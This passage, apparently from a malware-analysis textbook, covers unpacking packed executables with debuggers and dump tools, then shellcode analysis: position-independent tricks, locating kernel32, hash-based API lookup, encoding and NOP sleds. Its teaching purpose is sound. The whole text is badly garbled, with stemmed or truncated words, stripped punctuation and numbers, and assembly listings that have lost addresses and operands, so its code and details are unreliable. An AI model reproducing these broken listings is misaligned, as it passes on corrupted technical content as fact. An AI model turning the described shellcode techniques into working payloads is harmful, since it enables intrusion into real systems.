unpack stub complet must transfer execut oep instruct transfer execut oep commonli refer tail jump jump instruct simplest popular way transfer execut sinc common mani malici packer attempt obscur function use ret call instruct sometim tail jump obscur os function transfer control ntcontinu zwcontinu unpack illustr figur figur illustr pack unpack process follow figur show origin execut header section visibl start point set oep figur show pack execut exist disk visibl new header unpack stub pack origin code figur origin execut prior pack figur pack execut origin code pack unpack stub ad figur show pack execut exist load memori unpack stub unpack origin code valid text data section visibl start point execut still point unpack stub import tabl usual valid stage figur show fulli unpack execut import tabl reconstruct start point edit point oep note final unpack program differ origin program unpack program still unpack stub code pack program ad unpack program pe header reconstruct unpack exactli origin program figur program unpack load memori unpack stub unpack everyth necessari code run program start point still point unpack stub importsfigur fulli unpack program import tabl reconstruct start point back origin entri point oepidentifi pack program earli step analyz malwar recogn pack cover techniqu detect malwar pack earlier chapter well provid review also introduc new techniqu indic pack program follow list summar sign look determin whether malwar pack program import particularli import loadlibrari getprocaddress program open ida pro small amount code recogn automat analysi program open ollydbg warn program may pack program show section name indic particular packer upx program abnorm section size text section size raw data virtual size nonzero packerdetect tool peid also use determin execut pack entropi calcul pack execut also detect via techniqu known entropi calcul entropi measur disord system program welldefin standard mathemat formula calcul entropi mani wellform measur entropi digit data compress encrypt data close resembl random data therefor high entropi execut encrypt compress lower entropi autom tool detect pack program often use heurist like entropyon free autom tool mandiant red curtain calcul threat score execut use measur entropi red curtain scan filesystem suspect pack binariesunpack option three option unpack pack execut autom static unpack autom dynam unpack manual dynam unpack autom unpack techniqu faster easier manual dynam unpack autom techniqu dont alway work identifi kind packer use determin autom unpack avail may abl find inform unpack packer manual deal pack malwar rememb goal analyz behavior malwar alway requir recreat origin malwar time unpack malwar creat new binari ident origin thing originalautom unpack autom static unpack program decompress andor decrypt execut fastest method work best method sinc run execut restor execut origin state automat static unpack program specif singl packer work packer design thwart analysi pe explor free program work exe dll file come sever static unpack plugin part default setup default plugin support nspack upack upx unpack file pe explor complet seamless pe explor detect file youv chosen open pack automat unpack execut note want examin unpack execut outsid pe explor youll need save autom dynam unpack run execut allow unpack stub unpack origin execut code origin execut unpack program written disk unpack reconstruct origin import tabl autom unpack program must determin unpack stub end origin execut begin difficult packer fail identifi end unpack stub correctli unpack fail unfortun current good publicli avail autom dynam unpack mani publicli avail tool adequ job packer none quit readi seriou usag autom unpack techniqu work quickli easi use limit success malwar analyst must know differ autom static dynam unpack autom dynam unpack program run malici execut autom static unpack program time malici program run necessari make sure happen safe environ discuss chapter manual unpack sometim pack malwar unpack automat exist program often must unpack manual manual unpack sometim done quickli minim effort time long arduou process two common approach manual unpack program discov pack algorithm write program run revers run algorithm revers program undo step pack program autom tool approach still ineffici sinc program written unpack malwar specif individu pack program use even autom process take signific amount time complet run pack program unpack stub work dump process memori manual fix pe header program complet effici approach let walk simpl manual unpack process purpos exampl well unpack execut pack upx although upx easili unpack automat upx program simpl make good exampl youll work process first lab chapter begin load pack execut ollydbg first step find oep first instruct program pack find oep function one difficult task manual unpack process cover detail later chapter exampl use autom tool part ollydump plugin ollydbg note ollydump plugin ollydbg two good featur unpack dump memori current process search oep pack execut ollydbg select plugin ollydump find oep section hop theprogram hit breakpoint oep execut breakpoint hit code unpack memori origin program readi run code visibl avail analysi remain step modifi pe header code analysi tool interpret code properli debugg broken instruct oep write valu oep close ollydbg well use ollydump plugin dump execut select plugin ollydump dump debug process dump everyth process memori onto disk option screen dump file disk ollydbg dump program without make chang dump program includ pe header pack program pe header unpack program would need chang two thing correct header import tabl must reconstruct entri point pe header must point oep fortun dont chang option dump screen ollydump perform step automat entri point execut set current instruct pointer case oep import tabl rebuilt click dump button finish unpack execut abl unpack program simpl step oep locat import tabl reconstruct automat ollydump complex unpack simpl rest chapter cover unpack ollydump fail rebuild import tabl import reconstructor rebuild import tabl complic doesnt alway work ollydump unpack stub must resolv import allow applic run need rebuild origin import tabl ollydbg fail use tri use import reconstructor imprec perform stepsimprec use repair import tabl pack program run imprec open dropdown menu top screen see run process select pack execut next enter rva valu oep entir address oep field right exampl imag base x oep x enter x next click iat autosearch button see window messag state imprec found origin import address tabl iat click getimport list file import function appear left side main window oper success import say validy getimport function success import tabl fix automat use imprec strategi manual fix tabl discuss later chapter well assum import tabl discov success click fix dump button youll ask path file dump earlier ollydump imprec write new file underscor append filenam execut file make sure everyth work your sure whether youv done correctli basic unpack process work pack execut tri first mention earlier biggest challeng manual unpack malwar find oep well discuss next find oep mani strategi locat oep singl strategi work packer analyst gener develop person prefer tri favorit strategi first success analyst must familiar mani techniqu case favorit method work choos wrong techniqu frustrat timeconsum find oep skill must develop practic section contain varieti strategi help develop skill way realli learn practic order find oep need run malici program debugg use singlestep breakpoint recal differ type breakpoint describ chapter ollydbg offer four type breakpoint aretrigg differ condit standard int breakpoint memori breakpoint provid ollydbg hardwar breakpoint run trace break condit pack code unpack stub often unlik code debugg ordinarili deal pack code often selfmodifi contain call instruct return code mark code odditi featur confus debugg caus breakpoint fail use autom tool find oep easiest strategi much like autom unpack approach tool alway work may need find oep manual use autom tool find oep previou exampl use autom tool find oep commonli use automat tool find oep ollydump plugin within ollydbg call find oep section hop normal unpack stub one section execut pack anoth section ollydbg detect transfer one section anoth break use either stepov stepinto method stepov method stepov call instruct call often use execut code anoth section method design prevent ollydbg incorrectli label call oep howev call function return ollydbg locat oep malici packer often includ call function return effort confus analyst debugg stepinto option step call function like find oep also like produc fals posit practic tri stepov stepinto method find oep manual autom method find oep fail need find manual simplest manual strategi look tail jump mention earlier instruct jump unpack stub oep normal jmp instruct malwar author make ret instruct order evad detectionoften tail jump last valid instruct bunch byte invalid instruct byte pad ensur section properli bytealign gener ida pro use search pack execut tail jump exampl show simpl tail jump exampl exampl simpl tail jump c push edi c call ebp c pop eax c popad c lea eaxdword ptr ssesp ca push cc cmp espeax ce jnz short sampleca c sub esp c jmp sampl c db c db ca db cb db cc db cd db ce db exampl show tail jump upx locat address xc two featur indic clearli tail jump locat end code link address far away examin jump debugg would see hundr x byte jump uncommon return gener follow jump one isnt follow meaning code featur make jump stick size normal jump use condit statement loop go address within hundr byte jump goe address that xc byte away consist reason jmp statement graph view ida pro often make tail jump easi spot shown figur ida pro color jump red cant determin jump goe normal jump within function ida pro draw arrow target jmp instruct case tail jump ida pro encount error color jump redfigur tail jump highlight red ida pro graph view tail jump transfer execut origin program pack disk therefor tail jump goe address contain valid instruct unpack stub start contain valid instruct program run exampl show disassembl address jump target program load ollydbg instruct add byte ptr dseaxal correspond two x byte valid instruct ollydbg attempt disassembl instruct anyway exampl instruct byte store oep origin program unpack add byte ptr dseaxal add byte ptr dseaxal add byte ptr dseaxal add byte ptr dseaxal add byte ptr dseaxal add byte ptr dseaxal c add byte ptr dseaxal e add byte ptr dseaxal exampl contain disassembl found address tail jump execut origin execut unpack valid instruct locat chang anoth hallmark tail jump exampl instruct byte store oep origin program unpack call sampledc test eaxeax jnz short sample call sampl e push eax f call dword ptr ds kernelexitprocess retn anoth way find tail jump set read breakpoint stack rememb read breakpoint must use either hardwar breakpoint ollydbg memori breakpoint function disassembl includ unpack stub begin push instruct sort use advantag first make note memori address stack first valu push set breakpoint read stack locat initi push everyth els stack higher stack lower memori address unpack stub complet stack address origin push access therefor address access via pop instruct hit breakpoint break execut tail jump gener pop instruct often necessari tri sever differ type breakpoint address hardwar breakpoint read good type tri first note ollydbg interfac allow set breakpoint stack window must view stack address memori dump window set breakpoint anoth strategi manual find oep set breakpoint everi loop code allow monitor instruct execut without consum huge amount time go code loop andov normal code sever loop includ loop within loop identifi loop scan code set breakpoint loop method manual intens gener take longer method easi comprehend biggest pitfal method set breakpoint wrong place caus execut run complet without hit breakpoint happen dont discourag go back left keep set breakpoint along process find oep anoth common pitfal step function call never return stepov function call program continu run breakpoint never hit way address start return function call stepinto function instead step step everi function time consum advis use trial error determin stepov versu stepinto anoth strategi find tail jump set breakpoint getprocaddress unpack use getprocaddress resolv import origin function breakpoint hit getprocaddress far unpack stub still lot code tail jump set breakpoint getprocaddress allow bypass begin unpack stub often contain complic code anoth approach set breakpoint function know call origin program work backward exampl window program oep found begin standard wrapper code outsid main method wrapper alway find set breakpoint one function call commandlin program wrapper call getvers getcommandlinea function earli process tri break function call program isnt load yet cant set breakpoint call getvers set one first instruct getvers work well gui program getmodulehandlea usual first function call program break examin previou stack frame see call origin there good chanc begin function calledgetmodulehandlea getvers oep begin call instruct scroll search start function function start push ebp follow mov ebp esp tri dump program begin function oep your right function oep finish your wrong program still dump unpack stub alreadi finish abl view navig program ida pro wont necessarili know program start might get lucki ida pro might automat identifi winmain dllmain last tactic locat oep use run trace option ollydbg run trace give number addit breakpoint option allow set breakpoint larg rang address exampl mani packer leav text section origin file gener noth text section disk section left pe header loader creat space memori oep alway within origin text section often first instruct call within section run trace option allow set breakpoint trigger whenev instruct execut within text section breakpoint trigger oep usual found repair import tabl manual ollydump imprec usual abl rebuild import tabl search program memori look like list import function sometim fail need learn littl import tabl work order analyz malwar import tabl actual two tabl memori first tabl list name ordin use loader unpack stub determin function need second tabl list address function import code run second tabl need packer remov list name thwart analysi list name remov may need manual rebuild tabl analyz malwar without import inform extrem difficult best repair import inform whenev possibl simplest strategi repair import one time encount disassembl thisopen file ida pro without import inform see call import function label import function disassembl call import function indirect call address outsid load program shown exampl exampl call import function import tabl properli reconstruct push eax call dword dword xcc list show call instruct target base dword pointer ida pro navig dword see valu xcc outsid load program next open ollydbg navig address xcc see ollydbg label address writefil label import address impwritefil know function youll need go step import encount crossreferenc featur ida pro label call import function youv label enough function effect analyz malwar main drawback method may need label lot function search call import label drawback approach cant actual run unpack program isnt showstopp use unpack program static analysi still use pack program dynam analysi anoth strategi allow run unpack program manual rebuild import tabl find tabl import function rebuild origin import tabl hand pe file format open standard enter import function one time could write script enter inform biggest drawback approach tediou timeconsum note sometim malwar author use one packer doubl work analyst persist usual possibl unpack even doublepack malwar strategi simpl undo first layer pack use techniqu weve describ repeat undo secondlay pack strategi regardless number packer usedtip trick common packer section cover sampl popular packer like encount analyz malwar packer cover weve includ descript strategi unpack manual autom unpack also list alway work packer strategi find oep potenti complic also includ upx common packer use malwar ultim packer execut upx upx open sourc free easi use support wide varieti platform upx compress execut design perform rather secur upx popular high decompress speed small size low memori requir decompress routin upx design difficult reverseengin pose much challeng malwar analyst program pack upx unpack upx well command line option use decompress upxpack execut fairli easi overcom upx good packer learn manual unpack malwar howev mani stealthi malici program design appear pack upx realli pack anoth packer modifi version upx case upx program abl unpack execut find oep upx use mani strategi outlin earlier chapter also use find oep section hop featur ollydump simpli page unpack stub see tail jump dump file reconstruct import tabl ollydump success pecompact pecompact commerci packer design speed perform discontinu free student version still often use malwar author program pack packer difficult unpack includ antidebug except obfusc code pecompact plugin framework allow thirdparti tool incorpor malwar author often includ thirdparti tool make unpack even difficult unpack pecompact manual larg unpack upx program gener except need ollydbg set pass except program discuss detail chapter find oep look tail jump step function see tail jump consist jmp eax follow mani x byte aspack aspack focus secur employ techniqu make difficult unpack program aspack use selfmodifi code make difficult set breakpoint analyz gener set breakpoint caus program pack aspack termin prematur program still manual unpack use hardwar breakpoint set stack address addit aspack popular mani autom unpack avail effect vari autom unpack alway worth tri first option although may success unpack aspack pack file use autom techniqu like youll need unpack file manual begin open code unpack stub earli code see pushad instruct determin stack address use store regist set hardwar breakpoint one address ensur set break read instruct correspond popad instruct call breakpoint trigger instruct away tail jump lead oep petit petit similar aspack number way petit also use antidebug mechan make difficult determin oep petit code use singlestep except order break debugg resolv pass singlestep except program describ chapter best strategi use hardwar breakpoint stack find oep withaspack petit use complic code structur make easi spot oep gotten close origin code look normal unlik petit wrapper code petit also keep least one import librari origin import tabl although affect difficult unpack easili determin dll malwar use without unpack winupack winupack packer gui front end design optim compress secur commandlin version packer call upack autom unpack specif upack winupack although secur isnt focu winupack includ secur measur make difficult find oep render techniqu search tail jump use ollydump useless exampl show tail jump execut exampl tail jump program pack upack pop ecx ecxecx mov dword ptr ssebpaeax af popad b jnz short sampleupacba b mov eax b retn c ba push sampleupacf bf retn c mov eaxdword ptr ssebp c lea ecxdword ptr ssebpb cc push ecx cd push eax ce call dword ptr ssebpf mov dword ptr ssebpeax da lea eaxdword ptr ssebp e push eax e call dword ptr ssebpf e mov dword ptr ssebpaeax list tail jump middl unpack stub difficult spot push instruct follow return instruct extrem common tail jump code jump around arriv tail jump order make harder spot obscur tail jump push preced retn instruct modifi packer shortlybefor call jump also far cant identifi search long jump oep section unpack stub ollydump automat identifi tail jump via sectionhop method best strategi find oep program pack upack set breakpoint getprocaddress singlestep care instruct look loop set import resolut set breakpoint everi jmp call instruct singlestep forev set breakpoint spars program probabl miss breakpoint run complet discourag program run complet without hit breakpoint simpli restart applic debugg tri make mistak part process eventu singlestep onto ret instruct tail jump sometim recogn tail jump tricki case jump x byte away unpack stub much smaller x jump size usual jump oep good way doublecheck examin code around oep look like ordinari code compar unpack stub unpack stub often mani condit jump return middl function code around oep unusu element anoth strategi work upack set breakpoint getmodulehandlea gui program getcommandlinea commandlin program window function call shortli oep breakpoint trigger search backward code find oep sometim winupack crash ollydbg use pe header ollydbg pars incorrectli chapter show ollydbg isnt perfect issu pars binari run fine window outsid debugg encount problem alway tri use windbg attempt deciph pe header error themidathemida complic packer mani featur featur antidebug antianalysi make secur packer that difficult unpack analyz themida contain featur prevent analysi vmware debugg process monitor procmon themida also kernel compon make much difficult analyz code run kernel restrict analysi code gener run user space therefor subject restrict themida includ mani featur pack execut unusu bulki addit unlik packer themida code continu run entir time origin program run autom tool design unpack themida file success vari base version themida set use program pack themida mani featur set imposs find singl unpack strategi alway work autom tool dont work anoth great strategi use procdump dump process memori without debug procdump tool microsoft dump content window process design work debugg debugg biggest advantag procdump dump process memori without stop debug process extrem use packer advanc antidebug measur even debug execut use procdump dump unpack content execut run process doesnt complet restor origin execut allow run string analysi codeanalyz without fulli unpack program includ pack themida difficult unpack time might spend day tri unpack program success perhap packer use new techniqu simpli solv happen may luckyou dont alway need creat fulli unpack work execut order analyz piec malwar simplest case occur program unpack fail execut cant complet repair import tabl pe header case still use ida pro analyz program even though fulli execut dump program disk ida pro analyz specif section code navig memori address mark section code also run string program discuss chapter might reveal import function use inform analysi that possibl without fulli unpack limit depend goal may suffici unpack actual unpack entir origin program program begin run instead unpack portion origin program run portion time run next portion code portion unpack memori run creat consider overhead execut make difficult analyst unpack reverseengin techniqu unpack individu chunk code enabl write script unpack code least larg portion anoth option focu dynam analysispack dll addit complic associ pack dll capabl support packer handl export dll one complic export tabl dll point address export function dll pack export function also pack packer must account ensur dll oper properli unpack dll much differ unpack exe key thing rememb dll oep like execut dll function call dllmain call dll load oep dll origin start dllmain start address list pack dll address unpack stub place dllmain rather main method ollydbg load dll ollydbg tool call loaddllex allow load debug dll problem dllmain method call prior break ollydbg time break occur unpack stub alreadi execut difficult find oep get around open pe file locat characterist field imagefilehead section bit x place imagefilehead set dll field chang file interpret execut ollydbg open program exe abl appli unpack strategi discuss chapter youv found oep chang bit back program treat dll againconclus chapter cover larg number strategi deal pack softwar start basic packer work unpack softwar discuss autom unpack tool strategi next cover techniqu use manual unpack malici softwar singl strategi tool work case need familiar sever techniqu next chapter cover shellcod strategi recogn analyz malici shellcodelab goal lab chapter simpli unpack code analysi lab tri unpack code static analysi techniqu use may abl find autom unpack work lab autom unpack wont help learn skill need encount custom packer also master unpack may abl manual unpack file less time take find download use autom unpack lab pack version lab previou chapter task case unpack lab identifi chapter appear file labex labex part vi special topicschapt shellcod analysi shellcod refer payload raw execut code name shellcod come fact attack would usual use code obtain interact shell access compromis system howev time term becom commonli use describ piec selfcontain execut code shellcod often use alongsid exploit subvert run program malwar perform process inject exploit process inject similar shellcod ad run program execut process start shellcod requir author manual perform sever action softwar develop usual never worri exampl shellcod packag reli action window loader perform normal program startup includ follow place program prefer memori locat appli address reloc load prefer memori locat load requir librari resolv extern depend chapter introduc shellcod techniqu demonstr full work realworld exampl load shellcod analysi load run shellcod debugg problemat shellcod usual binari chunk data run way normal execut make thing easier well use shellcodelauncherex includ lab avail httpwwwpracticalmalwareanalysiscom load jump piec shellcod discuss chapter load shellcod ida pro static analysi rel simpl user must provid input load process sinc execut file format describ content shellcod firstyou must ensur correct processor type select load process dialog sampl chapter use intel x processor metapc processor type select bit disassembl prompt ida pro load binari perform automat analysi analysi must done manuallypositionindepend code positionindepend code pic code use hardcod address either code data shellcod pic assum locat particular memori locat execut runtim differ version vulner program may load shellcod differ memori locat shellcod must ensur memori access code data use pic techniqu tabl show sever common type x code data access whether pic tabl differ type x code data access instruct mnemon instruct byte positionindepend call sub e c ff ff ff ye jnz short loc e ye mov edx dword b mov eax ebp b fc ye tabl call instruct contain bit sign rel displac ad address immedi follow call instruct order calcul target locat call instruct shown tabl locat xa ad offset valu xffffffc locat instruct plu size call instruct byte result call target x jnz instruct similar call except use bit sign rel displac jnz instruct locat x ad togeth locat offset store instruct xe size instruct byte result jump target x see controlflow instruct call jump alreadi positionindepend calcul target address ad rel offset store instruct current locat specifi eip registercertain form call jump allow programm use absolut nonrel address positionindepend easili avoid mov instruct show instruct access global data variabl dword last byte instruct show memori locat x particular instruct positionindepend must avoid shellcod author compar mov instruct mov instruct access dword stack instruct use ebp regist base contain sign rel offset xfc type data access posit independ model shellcod author must use data access calcul runtim address refer data use offset locat follow section discuss find appropri runtim addressidentifi execut locat shellcod need derefer base pointer access data posit independ manner ad subtract valu base valu allow safe access data includ shellcod x instruct set provid eiprel data access controlflow instruct generalpurpos regist must first load current instruct pointer use base pointer obtain current instruct pointer may immedi obviou instruct pointer x system directli access softwar fact way assembl instruct mov eax eip directli load generalpurpos regist current instruct pointer howev shellcod use two popular techniqu address issu call pop fnstenv instruct use callpop call instruct execut processor push address instruct follow call onto stack branch request locat function execut complet execut ret instruct pop return address top stack load instruct pointer result execut return instruct call shellcod abus convent immedi execut pop instruct call load address immedi follow call specifi regist exampl show simpl hello world exampl use techniqu exampl call pop hello world exampl byte disassembl ec sub esp h xor edx edx e call sub c c f db hello world f c subf pop edi edi get string pointer push edx utyp mbok push edi lpcaption push edi lptext push edx hwnd null b ea e mov eax eeah messageboxa ff call eax push edx uexitcod b fa ca c mov eax ccafah exitprocess ff call eax call transfer control sub pic call instruct use eip rel valu xd calcul call target pop instruct load address store top stack edi rememb eip valu save call instruct point locat immedi follow call pop instruct edi contain pointer db declar db declar assembl languag syntax creat sequenc byte spell string hello world pop edi point hello world string method intermingl code data normal shellcod easili confus disassembl tri interpret data follow call instruct code result either nonsens disassembl complet halt disassembl process invalid opcod combin encount seen chapter use call pop pair obtain pointer data may incorpor larger program addit antireverseengin techniqu remain code call messageboxa show hello world messag exitprocess cleanli exit sampl use hardcod locat function call import function shellcod automat resolv loader hardcod locat make code fragil address come window xp sp box may differ find function address ollydbg open process press ctrl g bring enter express follow dialog enter messageboxa dialog press enter debugg show locat function long librari export userdl load process debug load step exampl shellcodelauncherex enter follow command line shellcodelauncherex helloworldbin bp l userth l user option requir shellcod call loadlibrarya shellcodelauncherex must make sure librari load bp option insert breakpoint instruct prior jump shellcod binari specifi option recal debugg regist justintim debug launch automat prompt program encount breakpoint debugg ollydbg regist justintim debugg open attach process encount breakpoint allow skip content shellcodelauncherex program begin start shellcod binari set ollydbg justintim debugg select option intim debug make ollydbg justintim debugg note reader wish execut exampl may need modifi hardcod function locat messageboxa exitprocess address found describ text address found patch helloworldbin within ollydbg place cursor instruct load hardcod function locat regist eax press spacebar bring ollydbg assembl dialog allow enter assembl code assembl ollydbg overwrit current instruct simpli replac eeah valu correct valu machin ollydbg patch program memori allow shellcod execut correctli use fnstenv x floatingpoint unit fpu provid separ execut environ within normal x architectur contain separ set specialpurpos regist need save os context switch process perform floatingpoint arithmet fpu exampl show byte structur use fstenv fnstenv instruct store state fpu memori execut bit protect mode exampl fpusavest structur definit struct fpusavest uintt controlword uintt statusword uintt tagword uintt fpuinstructionpoint uintt fpuinstructionselector uintt fpuopcod uintt fpuoperandpoint uintt fpuoperandselector uintt reserv field matter use fpuinstructionpoint byte offset contain address last cpu instruct use fpu provid context inform except handler identifi fpu instruct may caus fault field requir fpu run parallel cpu fpu gener except except handler simpli look interrupt return address identifi instruct caus fault exampl show disassembl anoth hello world program use fnstenv obtain eip valu exampl fnstenv hello world exampl byte disassembl ec sub esp h xor edx edx eb jmp short locc ea e dd eeah messageboxa fa ca c dd ccafah exitprocess c c f db hello world f c locc ee fldz f fnstenv byte ptr espch b pop ebx ebx point fldz b f lea edi ebxdh load helloworld pointer push edx utyp mbok push edi lpcaption push edi lptext push edx hwnd null b eb mov eax ebxh load messageboxa ff call eax call messageboxa push edx uexitcod b ef mov eax ebxh load exitprocess ff call eax call exitprocess fldz instruct push floatingpoint number onto fpu stack fpuinstructionpoint valu updat within fpu point fldz instruct perform fnstenv store fpusavest structur onto stack atespch allow shellcod pop load ebx fpuinstructionpoint valu pop execut ebx contain valu point locat fldz instruct memori shellcod start use ebx base regist access data embed code previou hello world exampl use call pop techniqu code call messageboxa exitprocess use hardcod locat function locat store data along ascii string print lea instruct load address hello world string subtract xd address fldz instruct store ebx mov instruct load first function locat messageboxa mov instruct load second function locat exitprocess note exampl contriv exampl common shellcod store creat function pointer array use fldz instruct exampl noncontrol fpu instruct use exampl execut use shellcodelauncherex follow command shellcodelauncherex hellofstenvbin bp l usermanu symbol resolut shellcod exist binari blob gain execut must someth use gain execut usual mean interact system api rememb shellcod use window loader ensur requir librari load avail make sure extern symbol resolv instead must find symbol shellcod previou exampl use hardcod address find symbol fragil method work specif version os servic pack shellcod must dynam locat function order work reliabl differ environ task typic use loadlibrarya getprocaddress loadlibrarya load specifi librari return handl getprocaddress function search librari export given symbol name ordin number shellcod access two function load librari system find export symbol point full access api function export kerneldl shellcod must follow find kerneldl memori pars kerneldl pe file search export function loadlibrarya getprocaddress find kerneldl memori order locat kerneldl well follow seri undocu window structur one structur contain load address kerneldl note window structur list microsoft develop network msdn site fulli document mani contain byte array name reserv warn structur may alter futur version window full list structur see httpundocumentedntinternalsnet figur show data structur typic follow order find base address kerneldl relev field offset within structur shown figur structur travers find kerneldl dllbase process begin teb access fs segment regist offset x within teb pointer peb offset xc within peb pointer pebldrdata structur contain three doubli link list ldrdatat structureson load modul dllbase field kerneldl entri valu seek three listentri structur link ldrdatat entri togeth differ order name ininitializationorderlink entri typic follow shellcod window vista kerneldl second dll initi ntdlldll mean second entri ininitializationorderlink list structur belong kerneldl howev begin window kerneldl longer second modul initi simpl algorithm longer work portabl shellcod instead need examin unicodestr fulldllnam field confirm kerneldl travers listentri structur import realiz flink blink pointer point equival listentri next previou ldrdatat structur mean follow ininitializationorderlink get kerneldl ldrdatatableentri need add eight pointer get dllbase instead ad x would pointer point start structur exampl contain sampl assembl code find base address kerneldl exampl findkernelbas implement stdcall dword findkernelbasevoid findkernelbas push esi xor eax eax mov eax fseaxx eax get pointer peb test eax eax high bit set winx js kernelx mov eax eax xc eax get pointer pebldrdata esi get pointer st ldrdatatableentryininitializationorderlinksflink mov esi eax xc eax get pointer nd ldrdatatableentryininitializationorderlinksflink lodsd mov eax eax eax get ldrdatatableentrydllbas jmp near finish kernelx jmp near kernelx winx support infinit loop finish pop esi ret list access teb use fs segment regist get pointer peb js jump sign instruct use test whether signific bit peb pointer set order differenti winx winnt system winnt includ window xp vista signific bit peb pointer typic never set high memori address reserv os use sign bit identifi os famili fail system use gb boot option caus user levelkernellevel memori split occur xc instead x ignor simpl exampl shellcod chose support winx enter infinit loop winx detect shellcod proce pebldrdata assum run window vista earlier simpli retriev second ldrdatatableentri ininitializationorderlink link list return dllbase fieldpars pe export data find base address kerneldl must pars find export symbol find locat kerneldl process involv follow sever structur memori pe file use rel virtual address rva defin locat within file address thought offset within pe imag memori pe imag base address must ad rva turn valid pointer export data store imageexportdirectori rva store array imagedatadirectori structur end imageoptionalhead locat imagedatadirectori array depend whether pe file bit applic bit applic typic shellcod assum run bit platform know compil time correct offset pe signatur directori array follow sizeofpesignatur sizeofimagefilehead sizeofimageoptionalhead byte relev field imageexportdirectori structur shown figur addressoffunct array rva point actual export function index export ordin altern way find export symbol shellcod need map export name ordin order use array use addressofnam addressofnameordin array two array exist parallel number entri equival indic array directli relat addressofnam array bit rva point string symbol name addressofnameordin array bit ordin given index idx array symbol addressofnamesidx export ordin valu addressofnameordinalsidx addressofnam array sort alphabet binari search quickli find specif string though shellcod simpli perform linear search start begin arrayto find export address symbol follow step iter addressofnam array look char entri perform string comparison desir symbol match found call index addressofnam inam index addressofnameordin array use inam valu retriev valu iordin use iordin index addressoffunct array valu retriev rva export symbol return valu request sampl implement algorithm shown later chapter part full hello world exampl figur kerneldl imageexportdirectoryonc shellcod find loadlibrarya load arbitrari librari return valu loadlibrarya treat handl win api examin handl valu show actual bit pointer dllbase librari load mean shellcod skip use getprocaddress continu use pe pars code dllbase pointer return loadlibrarya also benefici hash name use explain next section use hash export name algorithm discuss weak perform strcmp export name find correct one requir full name api function shellcod use includ ascii string size shellcod constrain string could push size shellcod limit common way address problem calcul hash symbol string compar result precomput valu store shellcod hash function need sophist need guarante within dll use shellcod hash shellcod use uniqu hash collis symbol differ dll symbol shellcod use fine common hash function bit rotaterightaddit hash shown exampl exampl hashstr implement stdcall dword hashstringchar symbol hashstr push esi push edi mov esi dword espxc load function argument esi calchash xor edi edi cld hashit xor eax eax lodsb load next byte input string cmp al ah je hashdon check end symbol ror edi xd rotat right xd add edi eax jmp near hashit hashdon mov eax edi pop edi pop esi retn function calcul bit dword hash valu string pointer argument edi regist treat current hash valu initi zero byte input string load via lodsb instruct byte null current hash rotat right xd current byte ad hash hash return eax caller compar result valu compil code note particular algorithm exampl becom commonli use due inclus metasploit variat use differ rotat amount hash size sometim seena full hello world exampl exampl show full implement findsymbolbyhash function use find export symbol load dll exampl findsymbolbyhash implement stdcall dword findsymbolbyhashdword dllbase dword symhash findsymbolbyhash pushad mov ebp esp x load st arg dllbase mov eax ebp xc get offset pe signatur load edx w datadirectori array assum pe mov edx ebp eax add edx ebp edx addr imageexportdirectori mov ecx edx x ecx numberofnam mov ebx edx x ebx rva addressofnam add ebx ebp rvava searchloop jecxz errordon end array jmp done dec ecx dec loop counter esi next name use ecx pointer byte mov esi ebxecx add esi ebp rvava push esi call hashstr hash current string check hash result arg stack symhash cmp eax esp x jnz searchloop point found string addressofnam mov ebx edxx ebx ordin tabl rva add ebx ebp rvava turn cx ordin name index use ecx valu byte mov cx ebxecx mov ebx edxxc ebx rva addressoffunct add ebx ebp rvava eax export function rva use ecx valu byte mov eax ebxecx add eax ebp rvava jmp near done errordon xor eax eax clear eax error done mov esp xc eax overwrit eax save stack popad retn function take argument pointer base dll bit hash valu correspond symbol find return pointer request function regist eax rememb address pe file store rva code need continu add dllbase valu kept regist ebpin exampl rva retriev pe structur creat pointer actual use code begin pars pe file get pointer pe signatur pointer imageexportdirectori creat ad correct offset assum bit pe file code begin pars imageexportdirectori structur load numberofnam valu addressofnam pointer string pointer addressofnam pass hashstr function result calcul compar valu pass function argument correct index addressofnam found use index addressofnameordin array locat obtain correspond ordin valu use index addressoffunct array valu user want written stack overwrit eax valu save pushad instruct valu preserv follow popad instruct exampl show complet hello world shellcod exampl use previous defin findkernelbas findsymbolbyhash function instead reli hardcod api locat exampl positionindepend hello world mov ebp esp sub esp h call suba call real start code db user db hello world suba pop ebx ebx get pointer data call findkernelbas mov ebp eax store kernel base address push eceeeh loadlibrarya hash push dword ptr ebp call findsymbolbyhash mov ebph eax store loadlibrarya locat lea eax ebx eax point user push eax call dword ptr ebph loadlibrarya mov ebp eax store user base address push bcdaah messageboxa hash push dword ptr ebp user dll locat call findsymbolbyhash mov ebpch eax store messageboxa locat push edeh exitprocess hash push dword ptr ebp kernel dll locat call findsymbolbyhash mov ebph eax store exitprocess locat xor eax eax lea edi ebx edi hello world pointer push eax utyp mbok push edi lpcaption push edi lptext push eax hwnd null call dword ptr ebpch call messageboxa xor eax eax push eax uexitcod call dword ptr ebph call exitprocess code begin use call pop obtain pointer data start call findkernelbas find kerneldl call findsymbolbyhash find export kerneldl hash xecee roraddit hash string loadlibrarya function return eax point actual memori locat loadlibrarya code load pointer user string call loadlibrarya function find export function messageboxa call display hello world messag final call exitprocess cleanli exit note use shellcod pe pars abil instead getprocaddress addit benefit make reverseengin shellcod difficult hash valu hide api call use casual inspectionshellcod encod order execut shellcod binari must locat somewher program address space trigger pair exploit mean shellcod must present exploit occur pass along exploit exampl program perform basic filter input data shellcod must pass filter vulner processs memori space mean shellcod often must look like legitim data order accept vulner program one exampl program use unsaf string function strcpi strcat set maximum length data write program read copi malici data fixedlength buffer use either function data easili exceed size buffer lead bufferoverflow attack function treat string array charact termin null x byte shellcod attack want copi buffer must look like valid data mean must null byte middl would prematur end stringcopi oper exampl show small piec disassembl code use access registri seven null byte select alon code could typic use asi shellcod payload exampl typic code highlight null byte push edi push eax phkresult push samdesir b lea ecx ebxdh push ulopt push ecx lpsubkey push h hkey hkeylocalmachin ff call dsregopenkeyexa program may perform addit saniti check data shellcod must pass order succeed follow byte printabl less x ascii byte byte alphanumer z z overcom filter limit vulner program nearli shellcodeencod main payload pass vulner program filter insert decod turn encod payload execut byte small decod section must written care instruct byte pass strict filter requir rest payload encod compil time also pass filter shellcod write decod byte back top encod byte usual shellcod selfmodifi decod complet decod transfer control main payload execut follow common encod techniqu xor payload byte constant byte mask rememb valu size b xor b xor b use alphabet transform singl byte payload split two bit nibbl ad printabl ascii charact shellcod encod addit benefit attack make analysi difficult hide humanread string url ip address also may help evad network idssnop sled nop sled also known nop slide long sequenc instruct preced shellcod shown figur nop sled requir present shellcod often includ part exploit increas likelihood exploit succeed shellcod author creat larg nop sled immedi preced shellcod long execut direct somewher within nop sled shellcod eventu run figur nop sled shellcod layout tradit 